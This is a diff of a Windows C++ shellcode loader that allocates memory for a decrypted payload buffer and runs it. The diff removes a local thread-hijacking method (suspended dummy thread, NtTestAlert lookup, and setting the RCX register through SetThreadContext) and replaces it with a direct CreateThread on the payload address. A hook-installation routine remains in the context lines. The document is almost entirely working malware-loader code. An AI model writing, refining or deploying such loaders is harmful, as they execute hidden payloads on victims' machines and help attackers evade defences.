@@ -6,14 +6,9 @@
 #include <psapi.h>
 #include "header.h"
 
-using fnNtTestAlert = NTSTATUS(NTAPI*)();
 
 void DoNothing() {
 	while (true) Sleep(10 * 1000);
-}
-
-void Dummy() {
-	Sleep(0);
 }
 
 void InstallHook(PVOID address, PVOID jump) {
@@ -113,8 +108,6 @@ void decrypt(char* data, size_t data_len, char* key, size_t key_len) {
 
 BOOL main() {
 
-	fnNtTestAlert pNtTestAlert = (fnNtTestAlert)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtTestAlert"));
-
 	// Allocate memory
 	PVOID payloadAddress = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (payloadAddress == NULL) {
@@ -137,20 +130,8 @@ BOOL main() {
 
 	// Local thread hijacking
 	HANDLE hThread = NULL;
-	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Dummy, NULL, CREATE_SUSPENDED, NULL);
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloadAddress, NULL, 0, NULL);
 	if (hThread == NULL) {
-		return -1;
-	}
-
-	LPCONTEXT pContext = new CONTEXT();
-	pContext->ContextFlags = CONTEXT_INTEGER;
-
-	if (!GetThreadContext(hThread, pContext)) {
-		return -1;
-	}
-	pContext->Rcx = (DWORD64)payloadAddress;
-
-	if (!SetThreadContext(hThread, pContext)) {
 		return -1;
 	}
 
